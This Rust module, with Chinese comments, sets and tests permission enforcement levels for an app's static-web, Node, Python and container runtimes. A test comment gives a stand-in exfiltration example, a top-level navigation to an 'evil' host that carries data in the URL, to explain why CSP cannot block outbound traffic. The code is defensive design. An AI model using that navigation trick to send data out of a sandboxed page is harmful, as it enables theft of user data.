//! runtime adapter 的公共部分:各运行时的**可用性探测**(`probe`)与**强制等级表**(`enforcement_for`)。
//! 一期只有 `static_web` 真正实现;Node/Python/容器只定义探测与强制等级,供安装计划和 Settings 展示。

mod probe;
mod resolve;

pub use probe::{
    CommandError, CommandOutput, CommandRunner, RuntimeAvailability, SystemRunner, probe_all,
    probe_docker, probe_node, probe_python,
};
pub use resolve::{ResolveError, Resolved, RuntimeResolver, SystemResolver};

use crate::manifest::Runtime;
use crate::permissions::{Enforcement, PermissionKey};
use crate::plan::EnforcementEntry;

/// 这个 runtime 上每条权限的强制等级(**诚实**:做不到就标 `Advisory`/`Unsupported`)。
///
/// - `static_web`:gateway 的 CSP 挡得住 fetch/XHR/子资源,**挡不住顶层导航、`window.open` 与 WebRTC**——所以出站网络
///   现在只能标 `Advisory`;承载页面的 WebView(A4)落地"禁止离开本 origin 的导航"策略之后再升级成 `Enforced`。
///   静态页没有服务端数据目录(`Unsupported`);剪贴板/下载/弹窗取决于 WebView(产品层),gateway 管不到(`Advisory`)。
/// - `node`/`python`:macOS 上没有轻量进程沙箱,全部 `Advisory`——只是声明,不隔离。
/// - `container`:挂载(`filesystem`)可由容器真正限制(`Enforced`);出站网络要额外的网络/代理配置,
///   一期不做(`Advisory`);其余同样取决于 WebView。
pub fn enforcement_for(runtime: &Runtime) -> Vec<EnforcementEntry> {
    use Enforcement::*;
    use PermissionKey::*;
    let table: [(PermissionKey, Enforcement); 5] = match runtime {
        Runtime::StaticWeb { .. } => [
            (NetworkOutbound, Advisory),
            (FilesystemData, Unsupported),
            (Clipboard, Advisory),
            (Downloads, Advisory),
            (Popups, Advisory),
        ],
        Runtime::Node { .. } | Runtime::Python { .. } => [
            (NetworkOutbound, Advisory),
            (FilesystemData, Advisory),
            (Clipboard, Advisory),
            (Downloads, Advisory),
            (Popups, Advisory),
        ],
        Runtime::Container { .. } => [
            (NetworkOutbound, Advisory),
            (FilesystemData, Enforced),
            (Clipboard, Advisory),
            (Downloads, Advisory),
            (Popups, Advisory),
        ],
    };
    table
        .into_iter()
        .map(|(key, enforcement)| EnforcementEntry { key, enforcement })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::{ContainerHttp, ProcessHttp};

    fn level(entries: &[EnforcementEntry], key: PermissionKey) -> Enforcement {
        entries
            .iter()
            .find(|e| e.key == key)
            .expect("每条权限都有一项")
            .enforcement
    }

    #[test]
    fn every_runtime_reports_every_permission_exactly_once() {
        let runtimes = [
            Runtime::StaticWeb {
                source: "web/".into(),
            },
            Runtime::Node {
                command: vec!["node".into()],
                lockfile: None,
                node: None,
                http: ProcessHttp {
                    port_env: "PORT".into(),
                },
            },
            Runtime::Python {
                command: vec!["python".into()],
                lockfile: None,
                python: None,
                http: ProcessHttp {
                    port_env: "PORT".into(),
                },
            },
            Runtime::Container {
                image: format!("x@sha256:{}", "a".repeat(64)),
                http: ContainerHttp { container_port: 80 },
            },
        ];
        for r in &runtimes {
            let entries = enforcement_for(r);
            assert_eq!(entries.len(), PermissionKey::ALL.len(), "{}", r.kind_name());
            for key in PermissionKey::ALL {
                assert_eq!(
                    entries.iter().filter(|e| e.key == key).count(),
                    1,
                    "{} {key:?}",
                    r.kind_name()
                );
            }
        }
    }

    #[test]
    fn static_web_is_advisory_on_network_until_the_webview_has_a_navigation_policy() {
        let e = enforcement_for(&Runtime::StaticWeb {
            source: "web/".into(),
        });
        // CSP 挡住 fetch/XHR/子资源,但挡不住顶层导航(`location.href = 'https://evil/?d=…'`)、`window.open`
        // 与 WebRTC;在 A4 的 WebView 导航策略(禁止离开本 origin)落地之前,不能把它标成 `Enforced`
        assert_eq!(
            level(&e, PermissionKey::NetworkOutbound),
            Enforcement::Advisory
        );
        assert_eq!(
            level(&e, PermissionKey::FilesystemData),
            Enforcement::Unsupported
        );
        for key in [
            PermissionKey::Clipboard,
            PermissionKey::Downloads,
            PermissionKey::Popups,
        ] {
            assert_eq!(level(&e, key), Enforcement::Advisory, "{key:?}");
        }
    }

    #[test]
    fn process_runtimes_never_claim_isolation() {
        let node = Runtime::Node {
            command: vec!["node".into()],
            lockfile: None,
            node: None,
            http: ProcessHttp {
                port_env: "PORT".into(),
            },
        };
        assert!(
            enforcement_for(&node)
                .iter()
                .all(|e| e.enforcement == Enforcement::Advisory)
        );
    }

    #[test]
    fn containers_enforce_mounts_but_not_outbound_network() {
        let c = Runtime::Container {
            image: format!("x@sha256:{}", "a".repeat(64)),
            http: ContainerHttp { container_port: 80 },
        };
        let e = enforcement_for(&c);
        assert_eq!(
            level(&e, PermissionKey::FilesystemData),
            Enforcement::Enforced
        );
        assert_eq!(
            level(&e, PermissionKey::NetworkOutbound),
            Enforcement::Advisory
        );
    }
}
